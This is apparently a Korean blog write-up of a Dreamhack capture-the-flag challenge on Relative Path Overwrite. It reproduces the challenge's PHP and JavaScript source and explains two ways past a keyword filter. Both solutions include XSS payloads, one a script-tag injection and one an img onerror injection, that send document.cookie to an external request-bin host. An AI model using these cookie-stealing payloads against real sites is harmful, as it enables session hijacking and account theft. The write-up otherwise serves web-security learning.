---
title : Dreamhack - Relative Path Overwrite
categories: [Dreamhack, Webhacking]
date: 2022-04-23 18:58 +0900
tags: [Relative Path Overwrite, rpo]
---

## Relative Path Overwrite
<hr style="border-top: 1px solid;"><br>

+ index.php

```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Relative-Path-Overwrite</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Relative-Path-Overwrite</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/?page=vuln&param=dreamhack">Vuln page</a></li>
            <li><a href="/?page=report">Report</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <?php
          $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
          if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
              include $page;
      ?>
    </div> 
</body>
</html>

```

<br>

+ filtering.js

```javascript
var filter = ["script", "on", "frame", "object"];
```

<br>

+ vuln.php

```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var param = `<?php echo str_replace("`", "", $_GET["param"]); ?>`;
    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

<br>

+ report.php

```php
<?php
if(isset($_POST['path'])){
    exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
    echo($output[0]);
}
?>

<form method="POST" class="form-inline">
    <div class="form-group">
        <label class="sr-only" for="path">/</label>
        <div class="input-group">
            <div class="input-group-addon">http://127.0.0.1/</div>
            <input type="text" class="form-control" id="path" name="path" placeholder="/">
        </div>
    </div>
    <button type="submit" class="btn btn-primary">Report</button>
</form>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution 1
<hr style="border-top: 1px solid;"><br>

escapeshellcmd, escapeshellargs
: <a href="https://learn.dreamhack.io/296#7" target="_blank">learn.dreamhack.io/296#7</a>

<br>

처음엔 CSP Bypass Advanced 문제처럼 base 태그를 이용해서 리플에서 서버를 열은 뒤 리플 서버로 경로를 변경하고 ```filter.js```를 불러오려 했다.

하지만 확인해보니 리플에 있는 filter.js 코드가 불려와지지 않았다. 그래서 경로를 ```/static/js/filter.js```로 하니 서버에서는 열리는데 그래도 안됬다.

<br>

찾아보니 ```<base>``` 태그는 ```<head>```에 있어야 한다고 한다. 
: ```it must be inside the <head> element.```
: <a href="https://www.w3schools.com/tags/tag_base.asp" target="_blank">www.w3schools.com/tags/tag_base.asp</a>

<br>

왜냐하면 ```<base>``` 태그의 위치에 따라 경로 변경이 적용되는게 다르기 때문이다.

head 태그는 맨 위에 있기 때문에 head 태그 안에서 그리고 head 안에서도 맨 위에서 사용되어야 전체적인 경로가 변경되는 것이다. 

**중간에서 사용되면 base 태그보다 위에서 불려온 스크립트나 스타일시트에서 사용된 경로의 base url 경로는 변경되지 않고 base 태그보다 아래에서 불려오는 것부터만 적용된다.**

그래서 base 태그를 이용해서 했을 때 ```<script src=filter.js></script>``` 코드가 base 태그보다 위에 있었기 때문에 적용되지 않아서 CSP Bypass Advanced 문제처럼 풀리지 않았던 것이다.

<br><br>

결국 강의를 보니.. filter.js가 로드되는 걸 우회해야 한다고 한다. 로드 되지 않으면 필터링이 안되기 때문이다.

그래서 base 태그로 우회한 다음 스크립트 태그를 이용할 수 있으므로 아래와 같이 하니 요청이 보내졌다.

payload
: ```?page=vuln&param=<base href="test">;</script><script>location.href="https://xgezyqb.request.dreamhack.games?cookie="%2bdocument.cookie</script>```

<br>

공격 방식은 강의에서는 좀 달랐다. DOM XSS라서 script 태그를 사용할 수 없다고 한다. 문제 풀이 방식에 두 가지가 있는 것 같다. 

위의 풀이는 **결국엔 입력 값과 필터링 단어들을 비교하기 전에 ```</script>``` 태그를 사용함으로써 vuln.php에 있는 필터링 코드를 우회할 수 있다.**

따라서 입력을 ```?page=vuln&param=</script><script>alert(1)</script>```라고 해주면 alert가 실행된다.

<br>

위의 방식은 문제에서 제대로 처리를 안해준 것 같다.  

아래는 RPO 취약점을 이용한 풀이로 강의에 있는 내용이다. 이렇게 풀어야 한다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution 2
<hr style="border-top: 1px solid;"><br>

Link
: <a href="https://dreamhack.io/lecture/courses/335" target="_blank">Exercise: Relative Path Overwrite</a>

<br>

RPO를 이용해서 하면은 ```filter.js```는 상대경로이다. 

따라서 현재 경로가 만약 ```http:host:port/```에서 ```http:host:port/?page=vuln```을 하면 현재 경로가 최상위 경로이므로 ```http:host:port/filter.js```를 탐색하여 로드한다.

하지만 만약 ```http:host:port/index.php/?page=vuln```이라면? 확인해보면 알 수 있다.

<br>

+ ```http://host1.dreamhack.games:17680/?page=vuln&param=hello```

![image](https://user-images.githubusercontent.com/52172169/164951087-de87bf2f-1ae8-43b6-9c81-543b8970321c.png)

<br>

+ ```http://host1.dreamhack.games:17680/index.php?page=vuln&param=hello``` (위와 동일)

![image](https://user-images.githubusercontent.com/52172169/164951105-1466964f-fd1a-40eb-b877-4c1bbaa79f2c.png)

<br>

+ ```http://host1.dreamhack.games:17680/index.php/?page=vuln&param=hello```

![image](https://user-images.githubusercontent.com/52172169/164951111-2ab14a9a-ddd1-4406-976d-e39a1d86704f.png)

<br>

![image](https://user-images.githubusercontent.com/52172169/164956540-434453c1-c5c1-46d9-a81f-0257ada65c88.png)

<br>

경로에 따라 filter.js가 로드되는 경로가 달라진다. 

원래는 ```http://host1.dreamhack.games:17680/filter.js```이어야 하는데 ```http://host1.dreamhack.games:17680/index.php/filter.js```가 로드됨으로써 필터링을 우회할 수 있다.

따라서 원래는 최상위 경로에 존재하는 filter.js 파일을 찾았으나, 현재 경로가 ```/index.php/```로 바뀜으로써 ```/index.php/```에 존재하는 filter.js 파일을 찾게 되므로 위와 같이 index.php의 코드를 읽어오는 것이다.

<br>

이 문제는 DOM XSS 문제이므로 script 태그를 이용한 공격이 불가능하다고 한다. 따라서 on 핸들러를 이용한 공격을 할 수 있다고 한다.
: ```index.php/?page=vuln&param=<img src=1 onerror=location.href="https://xgezyqb.request.dreamhack.games?cookie="%2bdocument.cookie>```

<br>

innerHTML security_considerations
: <a href="https://developer.mozilla.org/ko/docs/Web/API/Element/innerHTML#security_considerations" target="_blank">developer.mozilla.org/ko/docs/Web/API/Element/innerHTML#security_considerations</a>

**HTML5 는 innerHTML 과 함께 삽입된 ```<script>``` 태그가 실행되지 않도록 지정한다고 한다! 그래서 강의에서도 script 태그를 이용한 공격이 불가능하다고 했던 것.**

<br><br>
<hr style="border: 2px solid;">
<br><br>
